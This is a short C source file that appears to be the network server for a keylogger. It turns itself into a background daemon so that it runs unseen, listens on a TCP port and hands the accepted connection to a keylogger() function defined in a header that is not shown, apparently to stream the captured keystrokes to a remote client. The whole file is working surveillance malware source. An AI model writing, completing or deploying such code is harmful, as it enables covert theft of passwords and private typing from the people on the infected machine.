#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include "keylogger.h"


int main(){
    struct addrinfo *ailist, *aip;
    struct addrinfo hint;
    int sockfd, n, err, clientfd;
    char *host, buf[BUFLEN];

    if((n = sysconf(_SC_HOST_NAME_MAX)) < 0){
        n = 126;
    }
    if(( host = malloc(n)) == NULL){
        perror("malloc error");
    }
    if(gethostname(host, n) < 0){
        perror("gethostname error");
    }
    memset(&hint, 0, sizeof(hint));
    hint.ai_socktype = SOCK_STREAM;
    hint.ai_family = AF_INET;
    hint.ai_addr = NULL;
    
    if((err = getaddrinfo(host, "port here", &hint, &ailist)) < 0){
        fprintf(stderr, "getaddrinfo error: %s\n", gai_strerror(err));
    }

    daemon(0, 0); //server is running in the background

    for(aip = ailist; aip != NULL; aip = aip->ai_next){
        sockfd = socket(aip->ai_family, aip->ai_socktype, 0);
        if(sockfd < 0)
            perror("socket error");
        if(bind(sockfd, aip->ai_addr, aip->ai_addrlen) < 0)
            perror("bind error");
        if(listen(sockfd, 1) < 0) 
            perror("listen error");


        if((clientfd = accept(sockfd, aip->ai_addr, &aip->ai_addrlen)) < 0){
            perror("accept error");
        }
        if(send(clientfd, "sending information by the server...\n", strlen("sending information by the server...\n"), 0) < 0)
            perror("send error");
        keylogger(clientfd);
        exit(0);
    }
    
}